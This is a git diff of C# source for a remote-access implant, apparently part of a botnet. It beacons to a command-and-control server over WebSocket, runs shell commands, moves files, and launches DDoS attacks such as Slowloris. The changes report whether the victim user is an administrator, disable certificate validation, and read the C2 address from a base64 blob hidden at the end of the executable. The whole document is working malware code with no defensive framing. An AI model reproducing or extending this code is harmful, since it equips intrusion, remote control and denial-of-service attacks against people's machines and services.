@@ -17,6 +17,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Reflection;
+using System.Security.Principal;
 
 
 namespace Implant
@@ -34,7 +35,6 @@ namespace Implant
     {
         private string _c2WsUrl;
         private string _group;
-        private string _base_url;
         private string _currentDir;
         private Dictionary<int, byte[]> _chunkSequences = new Dictionary<int, byte[]>();
         private bool _running;
@@ -49,16 +49,21 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string c2WsUrl, string group = "default", string base_url="127.0.0.1:4000")
+        public Implant(string c2WsUrl, string group = "default")
         {
             _c2WsUrl = c2WsUrl;
             _group = group;
-            _base_url = base_url;
             _currentDir = Directory.GetCurrentDirectory();
             _running = true;
             _attacks = new List<Attack>();
             _implId = GetMachineGuid();
             _wsCancellationTokenSource = new CancellationTokenSource();
+        }
+
+        private async Task ExitWs()
+        {
+            CloseWebSocketAsync();
+            Environment.Exit(0);
         }
 
         public async Task Run()
@@ -85,7 +90,7 @@ namespace Implant
 
             _ws = new ClientWebSocket();
 
-            var uri = new Uri($"{_c2WsUrl}?id={_implId}");
+            var uri = new Uri($"wss://{_c2WsUrl}?id={_implId}-root={GetRoot()}-user={Environment.UserName}");
 
             try
             {
@@ -104,7 +109,6 @@ namespace Implant
             }
             catch (Exception ex)
             {
-
             }
         }
 
@@ -132,6 +136,36 @@ namespace Implant
 
             return Encoding.UTF8.GetString(ms.ToArray());
         }
+        
+
+
+        public async Task CloseWebSocketAsync()
+        {
+            try
+            {
+                _wsCancellationTokenSource?.Cancel();
+                
+                if (_ws != null && _ws.State == WebSocketState.Open)
+                {
+                    await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, 
+                                        "Client closing", 
+                                        CancellationToken.None);
+                }
+            }
+            catch (WebSocketException ex)
+            {
+            }
+            catch (Exception ex)
+            {
+            }
+            finally
+            {
+                _ws?.Dispose();
+                _wsCancellationTokenSource?.Dispose();
+                _ws = null;
+                _running = false;
+            }
+        }
 
 
         private async Task HandleCommand(string commandJson)
@@ -149,7 +183,7 @@ namespace Implant
                 {
                     var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
                     await HandleFileUpload(chunkData, data["destination"].ToString());
-                    
+
                 }
                 else if (data.ContainsKey("list_files"))
                 {
@@ -169,6 +203,10 @@ namespace Implant
                 {
                     await StopAttack(data["stop_attack"].ToString());
                 }
+                else if (data.ContainsKey("finish"))
+                {
+                    ExitWs();
+                }
             }
             catch (Exception e)
             {
@@ -176,35 +214,6 @@ namespace Implant
             }
         }
 
-        private async Task WriteAllBytesAsync(string path, byte[] bytes)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Create,
-                FileAccess.Write,
-                FileShare.None,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                await fileStream.WriteAsync(bytes, 0, bytes.Length);
-            }
-        }
-
-        private async Task<byte[]> ReadAllBytesAsync(string path)
-        {
-            using (var fileStream = new FileStream(
-                path,
-                FileMode.Open,
-                FileAccess.Read,
-                FileShare.Read,
-                bufferSize: 4096,
-                useAsync: true))
-            {
-                var bytes = new byte[fileStream.Length];
-                await fileStream.ReadAsync(bytes, 0, (int)fileStream.Length);
-                return bytes;
-            }
-        }
 
         private async Task ExecuteCommand(string command)
         {
@@ -219,8 +228,7 @@ namespace Implant
                 var result = ExecuteShellCommand(command);
                 await SendResponse(new
                 {
-                    result = result.output,
-                    error = result.error,
+                    result = !string.IsNullOrEmpty(result.output) ? result.output : result.error,
                     cwd = _currentDir
                 });
             }
@@ -299,15 +307,12 @@ namespace Implant
         {
             try
             {
-                // Decodificamos el chunk Base64
                 var part = Convert.FromBase64String(chunkData["data"].ToString());
                 var isLast = chunkData.ContainsKey("last") && (bool)chunkData["last"];
 
-                // Añadimos el chunk al buffer
                 _uploadBuffer.Add(part);
 
 
-                // Asignamos la ruta de destino solo una vez
                 if (_uploadDestination == null)
                 {
                     _uploadDestination = destination;
@@ -315,7 +320,6 @@ namespace Implant
 
 
 
-                // Si es el último chunk, escribimos el archivo
                 if (isLast)
                 {
                     using (var fs = new FileStream(_uploadDestination, FileMode.Create, FileAccess.Write))
@@ -505,7 +509,7 @@ namespace Implant
                         SlowlorisAttack(target, endTime, cancellationToken);
                         break;
                     default:
-                        throw new ArgumentException($"Tipo de ataque no soportado: {attackType}");
+                        throw new ArgumentException($"Unsupported attack: {attackType}");
                 }
             }
             finally
@@ -720,10 +724,12 @@ namespace Implant
                     public_ip = GetPublicIp(),
                     local_ip = GetLocalIps(),
                     operating_system = GetOperatingSystem(),
-                    impl_id = _implId,
+                    impl_id = $"{_implId}-root={GetRoot()}-user={Environment.UserName}",
                     hostname = Environment.MachineName,
-                    user = Environment.UserName
+                    user = Environment.UserName,
+                    root = GetRoot()
                 };
+
                 System.Net.ServicePointManager.ServerCertificateValidationCallback +=
                 (sender, cert, chain, sslPolicyErrors) => true;
                 
@@ -731,7 +737,7 @@ namespace Implant
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
 
-                    await client.PostAsync($"https://{_base_url}/api/impl/new/{model.impl_id}", content);
+                    await client.PostAsync($"https://{_c2WsUrl}/api/impl/new/{model.impl_id}", content);
                 }
             }
             catch (Exception ex)
@@ -865,6 +871,16 @@ namespace Implant
             }
         }
 
+
+
+        public bool GetRoot()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+
         private async Task SendResponse(object response)
         {
             if (_ws != null && _ws.State == WebSocketState.Open)
@@ -884,30 +900,32 @@ namespace Implant
            try
             {
 
+                string rutaCompleta = Assembly.GetExecutingAssembly().Location;
+                string nombreArchivo = Path.GetFileName(rutaCompleta);
 
-                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                string route_adsPath = @"\\?\" + exePath + ":Route";
-                string port_adsPath = @"\\?\" + exePath + ":Port";
-                string group_adsPath = @"\\?\" + exePath + ":Group";
+                byte[] datos = File.ReadAllBytes(rutaCompleta);
 
-                if (File.Exists(route_adsPath) && File.Exists(port_adsPath) && File.Exists(group_adsPath))
-                {
-                    string route = File.ReadAllText(route_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
-                    string port = File.ReadAllText(port_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
-                    string group = File.ReadAllText(group_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
+                int bytesParaLeer = Math.Min(1000, datos.Length);
+                byte[] finalBytes = new byte[bytesParaLeer];
+                Array.Copy(datos, datos.Length - bytesParaLeer, finalBytes, 0, bytesParaLeer);
 
-                    string base_url = $"{route}:{port}";
-                    var c2WsUrl = $"wss://{base_url}/api/rcv";
-                    var groupName = $"{group}";
+                string texto = Encoding.Unicode.GetString(finalBytes);
 
-                    var implant = new Implant(c2WsUrl, groupName, base_url);
-                    await implant.Run();
+                string[] raw_data = texto.Split(new string[] { "DATA=" }, StringSplitOptions.None);
 
-                }
-                else
-                {
-                }
+                string base64_data = raw_data[1];
+                byte[] base64Bytes = Convert.FromBase64String(base64_data);
+                string decode_data = Encoding.UTF8.GetString(base64Bytes);
 
+                string[] data = decode_data.Split('|');
+
+                string url = data[1];
+                string port = data[2];
+                string group = data[3];
+
+
+                var implant = new Implant( $"{url}:{port}", group);
+                await implant.Run();
 
 
             }
